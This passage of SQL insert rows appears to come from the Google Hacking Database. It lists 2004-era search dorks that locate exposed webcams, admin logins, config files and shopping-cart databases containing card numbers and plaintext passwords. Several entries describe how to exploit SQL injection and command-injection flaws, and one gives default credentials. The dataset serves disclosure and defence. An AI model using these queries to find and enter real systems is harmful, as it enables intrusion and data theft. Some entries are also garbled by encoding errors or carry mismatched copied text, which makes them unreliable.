(527, 'intitle:webeye inurl:login.ml', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=intitle%3Awebeye+inurl%3Alogin.ml+&btnG=Search', 1805, '2004-10-05', 'This one gets you on the webinterface of Webeye webcams.', '2004-10-05', NULL, NULL),
(528, 'inurl:"comment.php?serendipity"', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=inurl%3A%22comment.php%3Fserendipity%22&btnG=Search', 846, '2004-10-05', 'serendipity is a weblog/blog system, implemented with PHP. It is standards compliant, feature rich and open source.For an attacker it is possible to inject SQL commands.http://www.securityfocus.com/bid/11269/discussion/', '2004-10-05', NULL, NULL),
(529, '"Powered by AJ-Fork v.167"', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=%22Powered+by+AJ-Fork+v.167%22+%0D%0A&btnG=Search', 937, '2004-10-05', 'AJ-Fork is, as the name implies - a fork. Based on the CuteNews 1.3.1 core, the aim of the project is to improve what can be improved, and extend what  can be extended without adding too much bloat (in fierce opposition to the mainstream blogging/light publishing tools of today). The project aims to  be backwards-compatible with CuteNews in what areas are sensible.  It is vulnerable for a full path disclosure.  http://www.securityfocus.com/bid/11301', '2004-10-05', NULL, NULL),
(531, 'intitle:"axis storpoint CD" intitle:"ip address"', 'http://www.google.com/search?q=intitle:%22axis+storpoint+CD%22+intitle:%22ip+address%22&hl=en&lr=&ie=UTF-8&filter=0', 1751, '2004-10-05', 'Axis'' network CD/DVD servers are faster, less costly and easier to manage than using full-blown file servers for networking CD/DVD collections. Any organization that relies heavily on CD/DVD-based information can benefit from an AXIS StorPoint CD+.', '2004-10-05', NULL, NULL),
(532, 'intext:SQLiteManager inurl:main.php', 'http://www.google.com/search?q=intext%3ASQLiteManager+inurl%3Amain.php&btnG=Search&hl=en&lr=&ie=UTF-8', 1536, '2004-10-05', 'sQLiteManager is a tool Web multi-language of management of data bases SQLite.  # Management of several data base (Creation, access or upload basic)  # Management of the attached bases of donnÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¨es  # Creation, modification and removal of tables and index.  # Insertion, modification, suppression of recording in these tables', '2004-10-05', NULL, NULL),
(533, 'intitle:"oMail-admin Administration - Login" -inurl:omnis.ch', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22oMail-admin+Administration+-+Login%22++-inurl%3Aomnis.ch&btnG=Search', 2574, '2004-10-05', 'oMail-webmail is a Webmail solution for mail servers based on qmail and optionally vmailmgr or vpopmail. The mail is read directly from maildirs on the hard disk, which is much quicker than using protocols like POP3 or IMAP. Other features includes multiple language support (English, French, German, Japanese, Chinese, and many more), HTML and pictures inline display, folders, and address book support.', '2004-10-05', NULL, NULL),
(534, 'inurl:"map.asp?" intitle:"WhatsUp Gold"', 'http://www.google.com/search?q=inurl:%22map.asp%3F%22+intitle:%22WhatsUp+Gold%22&hl=en&lr=&ie=UTF-8&filter=0', 1399, '2004-10-05', '"WhatsUp Gold''s new SNMP Viewer tool enables Area-Wide to easily track variables associated with any port on a network device. With a few simple clicks, a network engineer can select device ports, navigate trees, and graph variables in real time. For instance, Area-Wide can track bandwidth or CPU utilization on a router to aid in capacity and resource management."', '2004-10-05', NULL, NULL),
(535, 'inurl:" WWWADMIN.PL" intitle:"wwwadmin"', 'http://www.google.com/search?q=inurl:%22+WWWADMIN.PL%22+intitle:%22wwwadmin%22&hl=en&lr=&ie=UTF-8&start=0&sa=N', 1816, '2004-10-06', 'wwwadmin.pl is a script that allows a user with a valid username and password, to delete files and posts from the associated forum.', '2004-10-06', NULL, NULL),
(536, 'inurl:odbc.ini ext:ini -cvs', 'http://www.google.com/search?hl=en&lr=&q=inurl%3Aodbc.ini+ext%3Aini+-cvs&btnG=Search', 1275, '2004-10-09', 'This search will show the googler ODBC client configuration files which may contain usernames/databases/ipaddresses and whatever.', '2004-10-09', NULL, NULL),
(537, 'intitle:"Web Data Administrator - Login"', 'http://www.google.com/search?q=intitle:%22Web+Data+Administrator+-+Login%22&hl=en&lr=&ie=UTF-8&filter=0', 4482, '2004-10-09', 'The Web Data Administrator is a utility program implemented in ASP.NET that enables you to easily manage your SQL Server data wherever you are. Using its built-in features, you can do the following from Internet Explorer or your favorite Web browser. Create and edit databases in Microsoft SQL Server 2000 or Microsoft SQL Server 2000 Desktop Engine (MSDE) Perform ad-hoc queries against databases and save them to your file system Export and import database schema and data.', '2004-10-09', NULL, NULL),
(539, 'intitle:"switch home page" "cisco systems" "Telnet - to"', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=intitle%3A%22switch+home+page%22+%22cisco+systems%22+%22Telnet+-+to%22&btnG=Search', 2072, '2004-10-09', 'Most cisco switches are shipped with a web administration interface. If a switch is reachable from the internet and google cashed it this search will show it.', '2004-10-09', NULL, NULL),
(540, 'intitle:"DEFAULT_CONFIG - HP"', 'http://www.google.com/search?q=intitle:%22DEFAULT_CONFIG+-+HP%22&ie=UTF-8&oe=UTF-8', 1562, '2004-10-09', 'searches for the web interface of HP switches.', '2004-10-09', NULL, NULL),
(541, '"Powered by yappa-ng"', 'http://www.google.com/search?q=%22Powered+by+yappa-ng%22&hl=en&lr=&filter=0', 895, '2004-10-09', 'yappa-ng is a very powerful but easy to install and easy to use online PHP photo gallery for all Operating Systems (Linux/UNIX, Windows, MAC, ...), and all Webservers (Apache, IIS, ...) with no need for a DataBase (no MySQL,...).yappa-ng is prone to a security vulnerability in the AddOn that shows a random image from any homepage. This issue may let unauthorized users access images from locked albums.http://www.securityfocus.com/bid/11314', '2004-10-09', NULL, NULL),
(543, 'inurl:changepassword.cgi -cvs', 'http://www.google.com/search?hl=en&lr=&q=inurl%3Achangepassword.cgi+-cvs&btnG=Search', 2339, '2004-10-09', 'Allows a user to change his/her password for authentication to the system.  Script allows for repeated failed attempts making this script vulnerable to brute force.', '2004-10-09', NULL, NULL),
(546, '"Powered by A-CART"', 'http://www.google.com/search?hl=es&q=%22Powered+by+A-CART%22+&meta=', 976, '2004-10-10', 'A-CART is an ASP shopping cart application written in VBScript. It is comprised of a number of ASP scripts and an Access database.  A security vulnerability in the product allows remote attackers to download the product''s database, thus gain access to sensitive information about users of the product (name, surname, address, e-mail, credit card number, and user''s login-password).  http://www.securityfocus.com/bid/5597 (search SF for more)', '2004-10-10', NULL, NULL),
(547, '"Online Store - Powered by ProductCart"', 'http://www.google.com/search?hl=es&q=%22Online+Store+-+Powered+by+ProductCart%22+&meta=', 1263, '2004-10-10', 'ProductCart is "an ASP shopping cart that combines sophisticated ecommerce features with time-saving store management tools and remarkable ease of use. It is widely used by many e-commerce sites". Multiple SQL injection vulnerabilities have been found in the product, they allow anything from gaining administrative privileges (bypassing the authentication mechanism), to executing arbitrary code. http://www.securityfocus.com/bid/8105 (search SF for more)', '2004-10-10', NULL, NULL),
(548, '"More Info about MetaCart Free"', 'http://www.google.com/search?hl=de&ie=ISO-8859-1&q=%22More+Info+about+MetaCart+Free%22&btnG=Suche&meta=', 6307, '2004-10-10', 'MetaCart is an ASP based shopping Cart application with SQL database. A security vulnerability in the free demo version of the product (MetaCartFree) allows attackers to access the database used for storing user provided data (Credit cart numbers, Names, Surnames, Addresses, E-mails, etc).', '2004-10-10', NULL, NULL),
(549, 'inurl:midicart.mdb', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=inurl%3Amidicart.mdb&btnG=Google-Suche&meta=', 9167, '2004-10-10', 'MIDICART is s an ASP and PHP based shopping Cart application with MS Access and SQL database. A security vulnerability in the product allows remote attackers to download the product''s database, thus gain access to sensitive information about users of the product (name, surname, address, e-mail, phone number, credit card number, and company name).', '2004-10-10', NULL, NULL),
(550, 'camera linksys inurl:main.cgi', 'http://www.google.com/search?q=camera+linksys+inurl%3Amain.cgi&start=0&start=0&ie=utf-8&oe=utf-8', 3879, '2004-10-10', 'Another webcam, Linksys style.', '2004-10-10', NULL, NULL),
(551, 'intitle:"MailMan Login"', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=intitle%3A%22MailMan+Login%22+++&btnG=Suche&meta=', 1142, '2004-10-11', 'MailMan is a product by Endymion corporation that provides a web based interface to email via POP3 and SMTP. MailMan is very popular due to its amazingly easy setup and operation.  MailMan is written as a Perl CGI script, the version that is shipped to customers is obfuscated in an attempt to prevent piracy. The code contains several insecure calls to open() containing user specified data. These calls can be used to execute commands on the remote server with the permissions of the user that runs CGI scripts, usually the web server user that is in most cases ''nobody''.', '2004-10-11', NULL, NULL),
(552, 'intitle:"my webcamXP server!" inurl:":8080"', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&client=firefox-a&q=intitle%3A%22my+webcamXP+server%21%22+inurl%3A%22%3A8080%22&btnG=Search', 3795, '2004-10-11', '"my webcamXP server!"Is there really an explantation needed?', '2004-10-11', NULL, NULL),
(553, '(inurl:webArch/mainFrame.cgi ) | (intitle:"web image monitor" -htm -solutions)', 'http://www.google.com/search?num=20&q=%28inurl%3AwebArch%2FmainFrame.cgi+%29+%7C+%28intitle%3A%22web+image+monitor%22+-htm+-solutions%29', 2241, '2004-10-11', 'The Ricoh Aficio 2035 (fax/scanner) web interface.Attackers may read faxes and can get information like internal ip addresses.cleanup by: yeseins &amp; golfocleanup date: Apr 28, 2005original dork: inurl:webArch/mainFrame.cgi', '2004-10-11', NULL, NULL),
(554, '"Powered by FUDforum"', 'http://www.google.com/search?hl=en&q=%22Powered+by+FUDforum%22+&btnG=B%C3%BAsqueda&meta=', 1354, '2004-10-11', 'FUDforum is a forums package. It uses a combination of PHP &amp; MySQL to create a portable solution that can run on virtually any operating system. FUDforum has two security holes that allow people to download or manipulate files and directories outside of FUDforum''s directories. One of the holes can be exploited by everyone, while the other requires administrator access. The program also has some SQL Injection problems.  http://www.securityfocus.com/bid/5501', '2004-10-11', NULL, NULL),
(555, '"BosDates Calendar System " "powered by BosDates v3.2 by BosDev"', 'http://www.google.com/search?hl=en&q=%22BosDates+Calendar+System+%22+%22powered+by+BosDates+v3.2+by+BosDev%22&btnG=B%C3%BAsqueda&meta=', 937, '2004-10-11', '"BosDates is a flexible calendar system which allows for multiple calendars, email notifications, repeating events and much more. All of which are easily maintained by even the least technical users."   There is a vulnerability in BosDates that allows an attacker to disclose sensitive information via SQL injection.', '2004-10-11', NULL, NULL),
(557, 'intitle:"Directory Listing, Index of /*/"', 'http://www.google.com/search?q=intitle:%22Directory+Listing,+Index+of+/*/%22&hl=en&lr=&filter=0', 1615, '2004-10-12', 'Vendor page:"Einfache HTTP-Server-Software fÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¼r privates Homepage-Hosting oder groÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸e Uploads."small HTTP server software for private hompage hosting or big uploads.', '2004-10-12', NULL, NULL),
(559, 'intitle:"Open WebMail" "Open WebMail version (2.20|2.21|2.30) "', 'http://www.google.com/search?hl=en&q=intitle%3A%22Open+WebMail%22+%22Open+WebMail+version+%282.20%7C2.21%7C2.30%29+%22&btnG=B%C3%BAsqueda&meta=', 2220, '2004-10-12', '"Open WebMail is a webmail system based on the Neomail version 1.14 from Ernie Miller. Open WebMail is designed to manage very large mail folder files in a memory efficient way. It also provides a range of features to help users migrate smoothly from Microsoft Outlook to Open WebMail". A remote attacker can run arbitrary commands with the web server''s privileges by exploiting an unfiltered parameter in userstat.pl.   Details  Vulnerable Systems:  * Open Webmail versions 2.20, 2.21 and 2.30  * Limited exploitation on openwebmail-current.tgz that was released on 2004-04-30 (See below)   The vulnerability was discovered in an obsolete script named userstat.pl shipped with Open Webmail. The script doesn''t properly filter out shell characters from the loginname parameter. The loginname parameter is used as an argument when executing openwebmail-tool.pl from the vulnerable script. By adding a ";", "|" or "( )" followed by the shell command to a http GET, HEAD or POST request an attacker can execute arbitrary system commands as an unprivileged user (the Apache user, "nobody" or "www", e.g.).', '2004-10-12', NULL, NULL),
(560, 'intitle:"EMUMAIL - Login" "Powered by EMU Webmail"', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=intitle%3A%22EMUMAIL+-+Login%22+%22Powered+by+EMU+Webmail%22+++&btnG=Search', 1028, '2004-10-12', 'The failure to strip script tags in emumail.cgi allows for XSS type of attack. Vulnerable systems:  * EMU Webmail version 5.0  * EMU Webmail version 5.1.0  Depending on what functions you throw in there, you get certain contents of the emumail.cgi file. The vulnerability was discovered in an obsolete script named userstat.pl shipped with Open Webmail. The script doesn''t properly filter out shell characters from the loginname parameter. http://www.securityfocus.com/bid/9861', '2004-10-12', NULL, NULL),
(561, 'intitle:"WebJeff - FileManager" intext:"login" intext:Pass|PAsse', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&client=firefox-a&q=intitle%3A%22WebJeff+-+FileManager%22+intext%3A%22login%22+intext%3APass%7CPAsse&btnG=Search', 929, '2004-10-12', 'WebJeff-Filemanager 1.x  DESCRIPTION: A directory traversal vulnerability has been identified in WebJeff-Filemanager allowing malicious people to view the contents of arbitrary files.  The problem is that the "index.php3" file doesn''t verify the path to the requested file. Access to files can be done without authorisation. http://www.securityfocus.com/bid/7995', '2004-10-12', NULL, NULL),
(562, 'inurl:netw_tcp.shtml', 'http://www.google.com/search?hl=en&q=inurl%3Anetw_tcp.shtml&btnG=B%C3%BAsqueda&meta=', 2756, '2004-10-12', 'An Axis Network Camera captures and transmits live images directly over an IP network (e.g. LAN/intranet/Internet), enabling users to remotely view and/or manage the camera from a Web browser on any computer [..]', '2004-10-12', NULL, NULL),
(563, 'intitle:"Object not found!" intext:"Apache/2.0.* (Linux/SuSE)"', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=intitle%3A%22Object+not+found%21%22+intext%3A%22Apache%2F2.0.*+%28Linux%2FSuSE%29%22&btnG=B%FAsqueda&meta=', 1502, '2004-10-12', 'This one detects apache werbservers (2.0.X/SuSE) with its error page.', '2004-10-12', NULL, NULL),
(564, 'inurl:"messageboard/Forum.asp?"', 'http://www.google.com/search?hl=en&lr=&q=inurl%3A%22messageboard%2FForum.asp%3F%22&btnG=Search', 1631, '2004-10-13', 'Multiple vulnerabilities have been found in GoSmart Message Board. A remote user can conduct SQL injection attack and Cross site scripting attack. http://www.securityfocus.com/bid/11361', '2004-10-13', NULL, NULL),
(565, 'intitle:"Directory Listing" "tree view"', 'http://www.google.com/search?q=intitle:%22Directory+Listing%22+%22tree+view%22&hl=en&lr=&ie=UTF-8&client=firefox-a&filter=0', 2584, '2004-10-14', 'Dirlist is an ASP script that list folders in an explorer style:   * Tree  * Detailed  * Tiled   Quote:  *Lists files and directories in either a Tree, Detailed, or Tiled view.  *Can set a "Starting Directory". This can be a IIS Virtual Directory path.  *Displays file and directory properties.  *Can specify directories which you do not want to display and access.  *Can specify directories which you only want to display and access.  *Can specify what file-types to only display.  *Displays custom file-type icons. This can be turned off in the settings.  * ''Detailed'' and ''tiled'' views display a Breadcrumb bar for easier navigation. This can be turned off in the settings.', '2004-10-14', NULL, NULL),
(566, 'inurl:default.asp intitle:"WebCommander"', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=inurl%3Adefault.asp+intitle%3A%22WebCommander%22+&btnG=Search', 1186, '2004-10-14', 'Polycom WebCommander gives you control over all aspects of setting up conferences on Polycom MGC MCUs. With Polycom WebCommander, scheduling and launching multipoint conferences, ad hoc meetings or future conferences is an easy, productive way to schedule meetings.', '2004-10-14', NULL, NULL),
(567, 'intitle:"Philex 0.2*" -script -site:freelists.org', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&client=firefox-a&q=intitle%3A%22Philex+0.2*%22+-script+-site%3Afreelists.org&btnG=Search', 1030, '2004-10-14', 'Philex (phile ''file'' explorer) is a web content manager based php   what philex can do ?  - easy navigation with tree structure  - create, delete, rename, copy and move folders/files.  - download files (normal or compressed :zip, gz, bz ).  - download many files as one compressed file.  - send files by email.  - upload local files to server', '2004-10-14', NULL, NULL),
(569, '"1999-2004 FuseTalk Inc" -site:fusetalk.com', 'http://www.google.com/search?hl=en&lr=&q=%221999-2004+FuseTalk+Inc%22+-site%3Afusetalk.com&btnG=Search', 988, '2004-10-15', 'Fusetalk forums (v4) are susceptible to cross site scripting attacks that can be exploited by passing a img src with malicious javascript.', '2004-10-15', NULL, NULL),
(570, '"2003 DUware All Rights Reserved"', 'http://www.google.com/search?q=%222003+DUware+All+Rights+Reserved%22&hl=en&lr=&filter=0', 1016, '2004-10-16', 'Multiple vulnerabilities have been identified in the software that may allow a remote attacker to carry out SQL injection and HTML injection attacks. An attacker may also gain unauthorized access to a user''s account.   DUclassmate may allow unauthorized remote attackers to gain access to a computer.   DUclassified is reported prone to multiple SQL injection vulnerabilities.   SQL injection issues also affect DUforum.   DUclassified and DUforum are also reported vulnerable to various unspecified HTML injection vulnerabilities.', '2004-10-16', NULL, NULL),
(571, '"WebExplorer Server - Login" "Welcome to WebExplorer Server"', 'http://www.google.com/search?hl=en&q=%22WebExplorer+Server+-+Login%22+%22Welcome+to+WebExplorer+Server%22&btnG=B%C3%BAsqueda&meta=', 1564, '2004-10-16', 'WebExplorer Server is a web-based file management system for sharing files with user permissions and quota limits. It features easy user interface and online administration which will allow you to manage users/groups/permissions without the need of server configuration knowledge. It can be used for remote file storage(eg FreeDrive)/hosting services, Companies/Educational institutions that need to share documents among people.', '2004-10-16', NULL, NULL),
(572, 'intitle:"ASP Stats Generator *.*" "ASP Stats Generator" "2003-2004 weppos"', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=intitle%3A%22ASP+Stats+Generator+*.*%22+%22ASP+Stats+Generator%22+%222003-2004+weppos%22&btnG=B%FAsqueda&meta=', 1698, '2004-10-16', 'ASP Stats Generator is a powerful ASP script to track web site activity. It combines a server side sniffer with a javascript system to get information about clients who are visiting your site.', '2004-10-16', NULL, NULL),
(573, '"Installed Objects Scanner" inurl:default.asp', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=%22Installed+Objects+Scanner%22+inurl%3Adefault.asp++&btnG=Search', 1326, '2004-10-16', 'Installed Objects Scanner makes it easy to test your IIS Webserver for installed components. Installed Objects Scanner also has descriptions and links for many components to let you know more on how using those components.   Just place the script on your server and view it in your browser to check your server for all currently known components.', '2004-10-16', NULL, NULL),
(574, 'intitle:"remote assessment" OpenAanval Console', 'http://www.google.com/search?q=%0Aintitle%3A%22remote+assessment%22+OpenAanval+Console', 1905, '2004-10-16', 'The Aanval Intrusion Detection Console is an advanced intrusion detection monitor and alerting system. Currently supporting modules for Snort and syslog - Aanval provides real-time monitoring, reporting, alerting and stability. Aanval''s web-browser interface provides real-time event viewing and system/sensor management.', '2004-10-16', NULL, NULL),
(577, '"This page has been automatically generated by Plesk Server Administrator"', 'http://www.google.com/search?hl=en&q=%22This+page+has+been+automatically+generated+by+Plesk+Server+Administrator%22&btnG=B%C3%BAsqueda&meta=', 1300, '2004-10-16', 'Plesk Server Administrator (PSA) is web based software that enables remote administration of web servers. It can be used on Linux and other systems that support PHP.   Due to an input validation error in Plesk Server Administrator, it is possible for a remote attacker to make a specially crafted web request which will display PHP source code.   This is acheivable by connecting to a host (using the IP address rather than the domain name), and submitting a request for a known PHP file along with a valid username.  http://www.securityfocus.com/bid/3737', '2004-10-16', NULL, NULL),
(578, '"The script whose uid is " "is not allowed to access"', 'http://www.google.com/search?q=%22The+script+whose+uid+is+%22+%22is+not+allowed+to+access%22&btnG=Search&hl=en&lr=&client=firefox-a', 1483, '2004-10-16', 'This PHP error message is revealing the webserver''s directory and user ID.', '2004-10-16', NULL, NULL),
(579, 'filetype:php inurl:nqt intext:"Network Query Tool"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=filetype%3Aphp+inurl%3Anqt+intext%3A%22Network+Query+Tool%22+&btnG=Search', 1404, '2004-10-18', 'Network Query Tool enables any Internet user to scan network information using:* Resolve/Reverse Lookup* Get DNS Records* Whois (Web)* Whois (IP owner)* Check port (!!!)* Ping host* Traceroute to host* Do it allThe author has been informed that the nqt form also accepts input from cross site pages, but he will not fix it.A smart programmer could use the port scan feature and probe al the nmap services ports. Though this would be slow, but it provides a higher degree of  anonymity, especially if the attacker is using a proxy or an Internet Cafe host to access the NQT pages.It gets even worse .. an attacker can scan the *internal* hosts of the networks that host NQT in many cases. Very dangerous.PS: this vulnerability was found early this year (search google for the full report), but was never added to the GHDB for some reason.', '2004-10-18', NULL, NULL),
(580, 'inurl:TiVoConnect?Command=QueryServer', 'http://www.google.com/search?q=inurl%3ATiVoConnect%3FCommand%3DQueryServer', 1523, '2004-10-18', 'Tivo is a the digital replacement for your analog videorecorder. It''s a digital media system that amongst other things allows recording tv shows to a hard disk. More information is available at http://www.tivo.com.This search was found in one of those cgi scanning tools out there. Currently there are only two results and only the first responds with information like this:1.0Sat Oct 16 15:26:46 EDT 2004JavaHMO1.0Leon Nicholls-This is an official build. Identifier: 2003.03.25-1612 Last Change: 112792In the future vulnerabilities may be found in this software. For now an attacker can enjoy the mp3 stream it provides (copy the server:port in winamp or xmms).', '2004-10-18', NULL, NULL),
(581, 'ext:mdb inurl:*.mdb inurl:fpdb shop.mdb', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=ext%3Amdb+inurl%3A*.mdb++inurl%3Afpdb+shop', 2233, '2004-10-18', 'The directory "http:/xxx/fpdb/" is the database folder used by some versions of FrontPage. It contains many types of Microsoft Access databases.One of them is Metacart, who used "shop.mdb" as their default name. It contains customer info like phone numbers but also plain text passwords. A screenshot is available at ImageShack: http://img49.exs.cx/img49/7673/shopmdb.jpgThree results only at time of writing. Remove the shop.mdb part to see the complete list of databases.', '2004-10-18', NULL, NULL),
(582, 'inurl:cgi-bin/testcgi.exe "Please distribute TestCGI"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=inurl%3Acgi-bin%2Ftestcgi.exe+%22Please+distribute+TestCGI%22', 1815, '2004-10-18', 'Test CGI by Lilikoi Software aids in the installation of the Ceilidh discussion engine for the World Wide Web. An attacker can use this to gather information about the server like: Operating System, IP and the full docroot path.', '2004-10-18', NULL, NULL),
(583, 'inurl:ttt-webmaster.php', 'http://www.google.com/search?q=inurl:ttt-webmaster.php&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 835, '2004-10-19', 'Turbo traffic trader Nitro v1.0 is a free, fully automated traffic trading script. Multiple vulnerabilities were found.Vulnerability report: http://www.securityfocus.com/bid/11358Vendor site: http://www.turbotraffictrader.com/php', '2004-10-19', NULL, NULL),
(584, 'intitle:"DVR Web client"', 'http://www.google.com/search?q=intitle:%22DVR+Web+client%22&hl=en&lr=&ie=UTF-8&client=firefox-a&filter=0', 2225, '2004-10-19', 'This embedded DVR is quick plug and play. Just plug it in and it will start recording. You can view all the cameras at once or one at a time. Allows individual pictures to come up on play back or all together. The best feature is the ability to connect via a network and play back existing stored video or view images live.* Four Channel Input* Horizontal Resolution 480 Lines* 16.7 Million Color Output* Display In Quad or Single Image (Full MultiPlex)* Motion Detection* Scheduling* Zoom in Live and Playback* 720H X 480V (Full) 360H X 240V In Quad* 0.1 FPS Thru 15 FPS each camera (60 FPS Total)* Web Interface TCP/IP With Client Software* Back-Up With Mark Image, VCR, Time Lapse, Remote Client Software* Full Remote Camera Controls (PTZ), Alarms, Wiper, Fans, Etc.', '2004-10-19', NULL, NULL),
(585, 'intitle:"ASP FileMan" Resend -site:iisworks.com', 'http://www.google.com/search?q=intitle:%22ASP+FileMan%22+Resend+-site:iisworks.com&num=100&hl=en&lr=&c2coff=1&safe=off&client=firefox-a&filter=0', 1851, '2004-10-19', 'FileMan is a corporate web based storage and file management solution for intra- and internet. It runs on Microsoft IIS webservers and is written in ASP. All user and group settings are stored in a MS Access or SQL database. Default user: user=admin, pass=passIn the default installation a diagnostigs page calleddiags.asp exists the manual recommends to delete it, but it can be found in some installs. The path to the database is also on the page. If the server is not configured correctly, the mdb file can be downloaded and the passwords are not encrypted.Site admins have been notified. As always: DO NOT ABUSE THIS.', '2004-10-19', NULL, NULL),
(586, 'intitle:"index.of *" admin news.asp configview.asp', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=intitle%3A%22index.of+*%22+admin+news.asp+configview.asp&btnG=Search', 1750, '2004-10-19', 'With Compulive News you can enter the details of your news items onto a webform and upload images through your browser. It integrates seamlessly within your website.When you open your CNU5 zip there is a news folder created with three subfolders: htmlarea, images and admin. In the news folder is your database file ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“news.mdbÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢.For security purposes the manual recommends that you immediately rename this database to a name of your own choosing thereby making it harder for anyone to download your news database.The database contains the plain text password. PS: this search is based on the index.of method. There are other ways to find this software, but finding the news database becomes a lot more difficult for an attacker that way.', '2004-10-19', NULL, NULL),
(587, '"Copyright ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â© 2002 Agustin Dondo Scripts"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&c2coff=1&q=%22Copyright+%C2%A9+2002+Agustin+Dondo+Scripts%22&btnG=Search', 1049, '2004-10-19', 'CoolPHP has multiple vulnerabilities:* Cross-Site Scripting vulnerability (index.php)* A Path Disclosure Vulnerability (index.php)* Local file include Vulnerability with Directory Traversal info: http://www.securityfocus.com/archive/1/378617', '2004-10-19', NULL, NULL),
(588, '"IMail Server Web Messaging" intitle:login', 'http://www.google.com/search?q=%22IMail+Server+Web+Messaging%22+intitle:login&hl=en&lr=&filter=0', 1516, '2004-10-19', 'IMail Server from Ipswitch is a messaging solution with 60 million users worldwide. It contains the features and safeguards you need without the complexity of expensive solutions like Microsoft ExchangeÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® or groupware which challenges even the most experienced administrators.This is a login portal search. Security Focus shows a list of vulnerabilities about this software.', '2004-10-19', NULL, NULL),
(589, 'intitle:"Directory Listing For" intext:Tomcat -intitle:Tomcat', 'http://www.google.com/search?hl=en&q=intitle%3A%22Directory+Listing+For%22+intext%3ATomcat+-intitle%3ATomcat', 2771, '2004-10-19', 'The Google Hackers Guide explains how to find Apache directory indexes, which are the most common found on the Internet. There are other ways however.This query is a generic search for servers using Tomcat with directory listings enabled. They are a bit more fancy than Apache''s default lists and more importantly they will not be found using "index.of".', '2004-10-19', NULL, NULL),
(590, 'site:.viewnetcam.com -www.viewnetcam.com', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=site%3A.viewnetcam.com+-www.viewnetcam.com', 2212, '2004-10-19', 'The FREE viewnetcam.com service allows you to create a personal web address (e.g., http://bob.viewnetcam.com) at which your camera''s live image can be found on the Internet. How the camera and service works: Special Software embedded within your Panasonic Network Camera gives your camera the ability to locate your unique Internet address. No matter what kind of Internet connection you have or which Internet provider you use, the viewnetcam.com service will keep your camera''s Internet address permanent.', '2004-10-19', NULL, NULL),
(591, 'inurl:/cgi-bin/finger? Enter (account|host|user|username)', 'http://www.google.com/search?hl=en&q=inurl%3A%2Fcgi-bin%2Ffinger%3F+Enter+%28account%7Chost%7Cuser%7Cusername%29+&btnG=Google+Search', 1476, '2004-10-19', 'The finger command on unix displays information about the system users. This search displays the webinterface for that command.', '2004-10-19', NULL, NULL),
(592, 'inurl:/cgi-bin/finger? "In real life"', 'http://www.google.com/search?q=inurl:/cgi-bin/finger%3F+%22In+real+life%22&num=100&hl=en&lr=&ie=UTF-8&filter=0', 1407, '2004-10-19', 'The finger command on unix displays information about the system users. This search displays pre-fingered users, so an attacker wouldn''t even have to guess their accounts.', '2004-10-19', NULL, NULL),
(593, 'inurl:"calendar.asp?action=login"', 'http://www.google.com/search?hl=en&lr=&q=inurl%3A%22calendar.asp%3Faction%3Dlogin%22+&btnG=Search', 2113, '2004-10-06', 'aspWebCalendar is a browser based software package that runs over a standard web browser, such as Internet Explorer from Microsoft, and allows an organization of any size to easily and cost effectively provide personal and group calendar functions to everyone in the organization.A vulnerability has been found for the (SQL version) script family from Full Revolution. Affected software is: aspWebAlbum, aspWebCalendar, aspWebHeadlines, aspWebMail. You can check it here: http://www.securityfocus.com/bid/11246Searches for aspWebAlbum and aspWebHeadlines:inurl:"album.asp?action=login"inurl:"news.asp?action=login"', '2004-10-06', NULL, NULL),
